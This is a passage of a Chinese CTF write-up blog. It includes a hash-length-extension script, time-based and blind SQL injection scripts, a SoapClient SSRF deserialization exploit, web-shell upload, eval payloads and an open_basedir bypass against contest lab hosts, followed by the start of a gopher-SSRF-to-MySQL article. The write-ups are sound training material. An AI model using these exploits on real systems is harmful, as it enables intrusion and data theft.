class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>exp脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">payload1=<span class="string">'flag.txt'</span></span><br><span class="line">payload=urllib.quote(payload1)</span><br><span class="line">url1=<span class="string">'http://139.180.128.86/geneSign?param='</span></span><br><span class="line">c=requests.get(url1+payload)</span><br><span class="line">s=c.text</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">m=hashpumpy.hashpump(s,<span class="string">'scan'</span>,<span class="string">'read'</span>,len(payload1)+<span class="number">16</span>)</span><br><span class="line">cookies=&#123;</span><br><span class="line">	<span class="string">'sign'</span>:m[<span class="number">0</span>],</span><br><span class="line">	<span class="string">'action'</span>:urllib.quote(m[<span class="number">1</span>])</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">"http://139.180.128.86/De1ta?param="</span></span><br><span class="line">r=requests.get(url+payload,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>

<p>结果如下</p>
<p><img src="https://s2.ax1x.com/2019/08/06/eWb4iT.png" alt="eWb4iT.png"></p>
<h3 id="ShellShellShell"><a href="#ShellShellShell" class="headerlink" title="ShellShellShell"></a>ShellShellShell</h3><p>N1CTF魔改，不过我没做过n1ctf，所以重新做了一遍，也理一下思路。首先可以通过备份文件拿到源码，其实主要漏洞点在user.php，由于这个文件内容有点多，所以只对主要部分进行分析，首先发现了一个可疑点，也就是register函数，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'code'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(substr(md5($_POST[<span class="string">'code'</span>]),<span class="number">0</span>, <span class="number">5</span>)!==$_SESSION[<span class="string">'code'</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"code error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">        $password = md5($_POST[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_username($username))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Invalid user name'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;is_exists($username)) &#123;</span><br><span class="line"></span><br><span class="line">            $db = <span class="keyword">new</span> Db();</span><br><span class="line"></span><br><span class="line">            @$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'username'</span>,<span class="string">'password'</span>,<span class="string">'ip'</span>,<span class="string">'is_admin'</span>,<span class="string">'allow_diff_ip'</span>),<span class="string">'ctf_users'</span>,<span class="keyword">array</span>($username,$password,get_ip(),<span class="string">'0'</span>,<span class="string">'1'</span>)); <span class="comment">//No one could be admin except me</span></span><br><span class="line">            <span class="keyword">if</span>($ret)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"The username is not unique"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有一个insert操作，并在旁边加了一个注释，没有人可以成为admin，并且直接在所有注册的情况下吧is_admin字段设置为0.所以通过注册是不可能成为admin的，但是这里的表中是可能存在is_admin等于1字段的用户的，也就是在这个表中存在admin的密码，我们可以通过注入得到admin的密码，接下来寻找一下注入点</p>
<p>漏洞点出现在publish函数，代码如下:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">publish</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_login()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'signature'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'mood'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            $mood = addslashes(serialize(<span class="keyword">new</span> Mood((int)$_POST[<span class="string">'mood'</span>],get_ip())));</span><br><span class="line">            $db = <span class="keyword">new</span> Db();</span><br><span class="line">            @$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'userid'</span>,<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>),<span class="string">'ctf_user_signature'</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">'signature'</span>],$mood));</span><br><span class="line">            <span class="keyword">if</span>($ret)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'pic'</span>])) </span><br><span class="line">            &#123;</span><br><span class="line">                $dir=<span class="string">'/app/upload/'</span>;</span><br><span class="line">                move_uploaded_file($_FILES[<span class="string">'pic'</span>][<span class="string">'tmp_name'</span>],$dir.$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>]);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('"</span>.$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>].<span class="string">"upload success');&lt;/script&gt;"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                </span><br><span class="line">     &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数有两个功能，第一个就是处理用户自主发布的信息，第二个就是处理图片上传，在第一个功能处存在明显漏洞，有可控的post字段，通过这个地方，即可达到注入拿到admin的密码，由于之前做完题没有当时写wp，现在写wp只能在复现环境上弄了。</p>
<p>成功进行延时注入</p>
<p><img src="https://s2.ax1x.com/2019/08/11/ej9BS1.png" alt="ej9BS1.png"></p>
<p>写出脚本跑一下密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">url=<span class="string">"http://web69.node1.buuoj.cn/index.php?action=publish"</span></span><br><span class="line">cookies=&#123;</span><br><span class="line">	<span class="string">"PHPSESSID"</span>:<span class="string">"fdrl361g5am95cn61tgp5qvkp2"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">"0123456789abcdefghiklmnopqrstuvwxyz"</span>:</span><br><span class="line">		data=&#123;</span><br><span class="line">	<span class="string">"signature"</span>:<span class="string">"1`,if((mid((select password from ctf_users limit 1),&#123;&#125;,1)=`&#123;&#125;`),sleep(5),1))#"</span>.format(i,j),</span><br><span class="line">	<span class="string">"mood"</span>:<span class="number">0</span></span><br><span class="line">&#125;	</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			<span class="keyword">print</span> data</span><br><span class="line">			r=requests.post(url=url,data=data,cookies=cookies,timeout=<span class="number">4.5</span>)</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			flag+=j</span><br><span class="line">			<span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/08/14/mkxbFI.png" alt="mkxbFI.png"></p>
<p>解密一下md5，发现密码是jaivypassword</p>
<p>进行登陆，不过登陆不上去，必须要本地登陆，这时就想起了ssrf,接着审计代码找一下ssrf的可控点，问题出在showmess函数，简单来看一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showmess</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_login()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//id,sig,mood,ip,country,subtime</span></span><br><span class="line">            $db = <span class="keyword">new</span> Db();</span><br><span class="line">            @$ret = $db-&gt;select(<span class="keyword">array</span>(<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>,<span class="string">'id'</span>),<span class="string">'ctf_user_signature'</span>,<span class="string">"userid = $this-&gt;userid order by id desc"</span>);</span><br><span class="line">            <span class="keyword">if</span>($ret) &#123;</span><br><span class="line">                $data = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">while</span> ($row = $ret-&gt;fetch_row()) &#123;</span><br><span class="line">                    $sig = $row[<span class="number">1</span>];</span><br><span class="line">                    $mood = unserialize($row[<span class="number">2</span>]);</span><br><span class="line">                    $country = $mood-&gt;getcountry();</span><br><span class="line">                    $ip = $mood-&gt;ip;</span><br><span class="line">                    $subtime = $mood-&gt;getsubtime();</span><br><span class="line">                    $allmess = <span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$row[<span class="number">3</span>],<span class="string">'sig'</span> =&gt; $sig, <span class="string">'mood'</span> =&gt; $mood, <span class="string">'ip'</span> =&gt; $ip, <span class="string">'country'</span> =&gt; $country, <span class="string">'subtime'</span> =&gt; $subtime);</span><br><span class="line">                    array_push($data, $allmess);</span><br><span class="line">                &#125;</span><br><span class="line">                $data = json_encode(<span class="keyword">array</span>(<span class="string">'code'</span>=&gt;<span class="number">0</span>,<span class="string">'data'</span>=&gt;$data));</span><br><span class="line">                <span class="keyword">return</span> $data;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $filenames = scandir(<span class="string">'adminpic/'</span>);</span><br><span class="line">        array_splice($filenames, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> json_encode(<span class="keyword">array</span>(<span class="string">'code'</span>=&gt;<span class="number">1</span>,<span class="string">'data'</span>=&gt;$filenames));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有反序列化函数并且存在方法的调用，可以想到SoapClient内置方法在调用不存在的方法时会触发call函数产生ssrf，既然看到了反序列化的点了，那么接着追踪一下序列化数据的来源，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'signature'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'mood'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            $mood = addslashes(serialize(<span class="keyword">new</span> Mood((int)$_POST[<span class="string">'mood'</span>],get_ip())));</span><br><span class="line">            $db = <span class="keyword">new</span> Db();</span><br><span class="line">            @$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'userid'</span>,<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>),<span class="string">'ctf_user_signature'</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">'signature'</span>],$mood));</span><br><span class="line">            <span class="keyword">if</span>($ret)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>这里有个int限制，我们直接通过十六进制插入到数据库就行，exp如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/index.php?action=login'</span>;</span><br><span class="line">$post_string = <span class="string">'username=admin&amp;password=jaivypassword&amp;code=0feeb'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=p1dj1cjhpc90jjk8atvo3ku8m2'</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>.(string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string,<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> bin2hex($aaa);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>用这里的cookie就可以以管理员的身份登陆了，登陆后发现可以上传文件，直接上传一下shell，</p>
<p>这里直接访问upload目录就能访问到shell了，因为是app目录，在这个服务器上并没有发现flag，所以看一下/etc/hosts,接着看看这个内网网段都有什么，在0.2发现了一些问题，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sandbox = <span class="string">'/var/sandbox/'</span> . md5(<span class="string">"prefix"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>])&#123;</span><br><span class="line">    $filename = !<span class="keyword">empty</span>($_POST[<span class="string">'file'</span>]) ? $_POST[<span class="string">'file'</span>] : $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!is_array($filename)) &#123;</span><br><span class="line">        $filename = explode(<span class="string">'.'</span>, $filename);</span><br><span class="line">    &#125;</span><br><span class="line">    $ext = end($filename);</span><br><span class="line">    <span class="keyword">if</span>($ext==$filename[count($filename) - <span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"try again!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $new_name = (string)rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">"."</span>.$ext;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$new_name);</span><br><span class="line">    $_ = $_POST[<span class="string">'hello'</span>];</span><br><span class="line">    <span class="keyword">if</span>(@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">'@&lt;?php'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($_,$new_name)===<span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>($_);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can do it!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink($new_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实是原题，最终结果如下</p>
<p><img src="https://s2.ax1x.com/2019/08/17/mnZPgK.png" alt="mnZPgK.png"></p>
<p>GIFTBox</p>
<p>一道当时没做出来的题，赛后来复盘一下</p>
<p>进入页面后ls一下发现一个md文件，查看一下内容，发现内容如下</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">login [<span class="type">username</span>] [<span class="type">password</span>]</span><br><span class="line">logout</span><br><span class="line">launch</span><br><span class="line">targeting [<span class="type">code</span>] [<span class="type">position</span>]</span><br><span class="line">destruct</span><br></pre></td></tr></table></figure>

<p>很明显需要先登陆<code>login admin 111</code>，显示密码不正确，换个用户名显示用户不存在，通过以下对比很明显发现存在注入</p>
<p><img src="https://s2.ax1x.com/2019/08/21/mtHSF1.png" alt="mtHSF1.png"></p>
<p>去看一下请求</p>
<p><img src="https://s2.ax1x.com/2019/08/21/mtHs0J.png" alt="mtHs0J.png"></p>
<p>是可以进行注入，但是并不是太清楚totp的作用，google一下，因为我想用python写脚本，所以搜的是python totp.链接如下</p>
<p><a href="https://blog.csdn.net/juxua_xatu/article/details/50252957" target="_blank" rel="noopener">https://blog.csdn.net/juxua_xatu/article/details/50252957</a></p>
<p><a href="https://pypi.org/project/pyotp/" target="_blank" rel="noopener">https://pypi.org/project/pyotp/</a></p>
<p>可通过如下脚本拿到hint</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">                payload=<span class="string">"login admin'/**/and/**/(ascii(mid((select/**/password/**/from/**/users/**/limit/**/0,1),&#123;&#125;,1))='&#123;&#125;')='1 1"</span>.format(i,j)</span><br><span class="line">                url=<span class="string">"http://web72.node1.buuoj.cn/shell.php"</span></span><br><span class="line">                true_url=url+<span class="string">'?a='</span>+urllib.quote(payload)+<span class="string">'&amp;totp='</span>+totp.now()</span><br><span class="line">                r=requests.get(true_url)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        flag+=chr(j)</span><br><span class="line">                        <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/08/21/mtXKsK.png" alt="mtXKsK.png"></p>
<p>其实我还写了一个ajax的，但是发现…可能是因为我代码的问题，不太稳定，也放一下</p>
<p><img src="https://s2.ax1x.com/2019/08/21/mN9cAf.png" alt="mN9cAf.png"></p>
<p>可以得到密码进行admin登陆，然后发现多了几个功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">targeting 设置变量</span><br><span class="line"></span><br><span class="line">launch运行</span><br><span class="line"></span><br><span class="line">destruct 重置变量</span><br></pre></td></tr></table></figure>

<p>这里还是要先看一下phpinfo()</p>
<p>payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">targeting a phpinfo</span><br><span class="line"></span><br><span class="line">targeting b &#123;$a()&#125;</span><br><span class="line"></span><br><span class="line">targeting c $&#123;eval($b)&#125;</span><br><span class="line"></span><br><span class="line">launch</span><br></pre></td></tr></table></figure>

<p>看一下disable_function</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"e"</span>&gt;</span>disable_functions<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"v"</span>&gt;</span>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,dl,exec,system,passthru,popen,proc_open,shell_exec,mail,imap_open,imap_mail,getenv,setenv,putenv,apache_setenv,symli</span><br></pre></td></tr></table></figure>

<p>看一下open_basedir</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"e"</span>&gt;</span>open_basedir<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"v"</span>&gt;</span>/app:/sandbox<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"v"</span>&gt;</span>/app:/sandbox<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>应该是去bypass open_basedir去拿flag，之前也有看过这个漏洞，先写个shell,然后传进去bypass的payload就减少了很多麻烦</p>
<p>shell的payload如下</p>
<p>targeting a _GET</p>
<p>targeting b x</p>
<p>targeting c {$aa{$b}}</p>
<p>targeting d ${eval($c)}</p>
<p>最终exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>:<span class="string">'dooinkm2slsr2b6ahp4dju9o0s'</span>&#125;</span><br><span class="line"><span class="comment">#targeting a _GET</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#targeting b x</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#targeting c &#123;$aa&#123;$b&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#targeting d $&#123;eval($c)&#125;</span></span><br><span class="line">payload=<span class="string">"launch"</span></span><br><span class="line">url=<span class="string">"http://web72.node1.buuoj.cn/shell.php"</span></span><br><span class="line">true_url=url+<span class="string">'?a='</span>+urllib.quote(payload)+<span class="string">'&amp;totp='</span>+totp.now()+<span class="string">"&amp;x=chdir('js');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/flag'));"</span></span><br><span class="line">r=requests.get(true_url,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure>

<p>这里看其他师傅的wp的做法也挺好，贴一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"chdir"</span>;</span><br><span class="line">$b = <span class="string">"js"</span>;</span><br><span class="line">$c = <span class="string">"$&#123;$a($b)&#125;"</span>; <span class="comment">//chdir('js');</span></span><br><span class="line">$d = <span class="string">"ini_set"</span>;</span><br><span class="line">$e = <span class="string">"open_basedir"</span>;</span><br><span class="line">$f = <span class="string">".."</span>;</span><br><span class="line">$g = <span class="string">"&#123;$d($e,$f)&#125;"</span>; <span class="comment">//ini_set('open_basedir','..');</span></span><br><span class="line">$h = <span class="string">"&#123;$a($f)&#125;"</span>; <span class="comment">//chdir('..');</span></span><br><span class="line">$h1 = <span class="string">"chr"</span>;</span><br><span class="line">$l = <span class="string">"&#123;$h1(47)&#125;"</span>; <span class="comment">//$l = '/'; 不允许直接出现'/'符号</span></span><br><span class="line">$m = <span class="string">"&#123;$d($e,$l)&#125;"</span>; <span class="comment">//ini_set('open_basedir','/');</span></span><br><span class="line">$n = <span class="string">"var_dump"</span>;</span><br><span class="line">$o = <span class="string">"scandir"</span>;</span><br><span class="line">$p = <span class="string">"&#123;$n($o($l))&#125;"</span>; <span class="comment">//var_dump(scandir('/'));</span></span><br></pre></td></tr></table></figure>

<h3 id="9calc"><a href="#9calc" class="headerlink" title="9calc"></a>9calc</h3><p>拟态防御—有机会学习一下</p>
<h3 id="cloudmusic-rev"><a href="#cloudmusic-rev" class="headerlink" title="cloudmusic_rev"></a>cloudmusic_rev</h3><p>webin…不太会..有机会学习一下.</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Gopher协议邂逅内网应用</title>
    <url>/2019/06/30/Gopher%E5%8D%8F%E8%AE%AE%E9%82%82%E9%80%85%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<h3 id="gopher协议攻击内网Mysql"><a href="#gopher协议攻击内网Mysql" class="headerlink" title="gopher协议攻击内网Mysql"></a>gopher协议攻击内网Mysql</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>SSRF(Server-Side Request Forgery)服务端请求伪造攻击，是由攻击者构造形成由服务器端发起请求的漏洞，SSRF攻击的目标通常为内网应用，如<code>Mysql,redis,Fastcgi</code>等。</p>
<h4 id="Mysql介绍"><a href="#Mysql介绍" class="headerlink" title="Mysql介绍"></a>Mysql介绍</h4><p>Mysql分为服务端和客户端，客户端连接服务端的三种方式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Unix套接字；</span><br><span class="line">内存共享&#x2F;命名管道；</span><br><span class="line">TCP&#x2F;IP套接字</span><br></pre></td></tr></table></figure>

<ul>
<li>在<code>Linux</code>环境下，客户端输入<code>mysql -u root -p root</code>登陆<code>Mysql</code>服务器用的则为Unix嵌套字连接；<code>Unix</code>并不是一个网络协议，只能在客户端与服务器端在同一台电脑上才可以使用。</li>
<li><code>windows</code>系统中客户端与Mysql服务器在同一台电脑，则使用命名管道/内存共享。</li>
<li>TCP/IP套接字是任何系统下都可以使用的方式，也是最多的连接方式，当输入<code>mysql -h 127.0.0.1 -u root -p root</code>时使用的就是TCP/IP嵌套字。</li>
</ul>
<h4 id="Mysql认证过程："><a href="#Mysql认证过程：" class="headerlink" title="Mysql认证过程："></a>Mysql认证过程：</h4><p>Mysql客户端连接登陆服务器端有两种方式:</p>
<ul>
<li>密码认证：服务器先发送salt然后使用salt进行加密密码然后验证</li>
<li>无密码认证：客户端直接发送TCP/IP数据包</li>
</ul>
<p>在非交互模式下登陆操作<code>Mysql</code>是在无需密码认证，非授权情况下进行的，而<code>SSRF</code>漏洞攻击内网<code>Mysql</code>也是在非授权情况下也就是无密码认证的情况下进行的。</p>
